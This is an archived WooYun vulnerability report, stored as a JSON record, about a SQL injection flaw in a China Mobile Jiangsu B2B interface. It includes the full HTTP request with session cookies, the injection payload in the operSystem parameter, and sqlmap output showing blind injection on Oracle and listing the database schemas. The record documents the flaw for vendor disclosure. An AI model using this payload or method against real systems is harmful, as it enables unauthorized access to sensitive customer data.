{"id": 86196, "wybug_id": "wooyun-2016-0188023", "wybug_title": "中国移动某省级站点接口存在SQL注入涉及大量敏感信息", "wybug_corp": "江苏移动", "wybug_author": "路人甲", "wybug_date": "2016-03-23 13:10", "wybug_open_date": "2016-05-09 17:49", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-09：\t细节向公众公开  简要描述： 江苏移动某接口存在SQL注入涉及大量敏感信息 详细说明：  存在问题的请求如下\nPOST /b2b/actionDispatcher.do HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://**.**.**.**/b2b/phoneSearchCenter.jsp?keyValue=%25E8%2581%2594%25E6%2583%25B3&flag=1Content-Length: 224Cookie: _ga=GA1.2.962280857.1450705224; CmLocation=210|210; CmProvid=sh; WT_FPC=id=2a1cd669070c664f8a51458700697878:lv=1458700983124:ss=1458700697878; tK1gTQFA2C=MDAwM2IyYThiNjAwMDAwMDAwNjQwclQlEQoxNDU4NzI5NzY5; B2B_JSESSIONID=8V4jWyCJDbFMMdM9nS1dwJHQDLLtXvHGz7wtMykh4hgZbpp4Y0gT!-181881616Connection: keep-alivePragma: no-cacheCache-Control: no-cachereqUrl=phoneSearchCenterNew&brand=&operSystem=5&price=&screenSize=&mobileCPUType=&networkMode=&hasStock=false&supplierNum=&keyValue=%25E8%2581%2594%25E6%2583%25B3&brandKey=undefined&classifyKey=undefined&flag=\noperSystem存在注入注入payload如下operSystem=5')+and+('1'='1   漏洞证明：  sqlmap获取数据如下：当前库KFZXBTBsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: (custom) POSTParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: reqUrl=phoneSearchCenterNew&brand=&operSystem=5') AND 2851=2851 AND ('PpGp'='PpGp&price=&screenSize=&mobileCPUType=&networkMode=&hasStock=false&supplierNum=&keyValue=%E8%81%94%E6%83%B3&brandKey=undefined&classifyKey=undefined&flag=---[21:10:10] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[21:10:10] [INFO] the back-end DBMS is Oracleweb application technology: Servlet 3.0, JSP, JSP 2.2, Nginxback-end DBMS: Oracle[21:10:10] [INFO] fetching current database[21:10:10] [INFO] resuming partial value: K[21:10:10] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[21:10:10] [INFO] retrieved: you provided a HTTP Cookie header value. The target URL provided its own cookies within the HTTP Set-Cookie header which intersect with yours. Do you want to merge them in futher requests? [Y/n] FZXBTB[21:13:54] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'KFZXBTB'[21:13:54] [INFO] fetched data logged to text files under '/root/.sqlmap/output/**.**.**.**'[*] shutting down at 21:13:54available databases [4]:[*] KFZXBTB[*] SYS[*] SYSTEM[*] TSMS1里面的库都很大，动不动就几千张表。。。   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-03-25 17:49 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向中国移动集团公司通报，由其后续协调网站管理部门处置 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}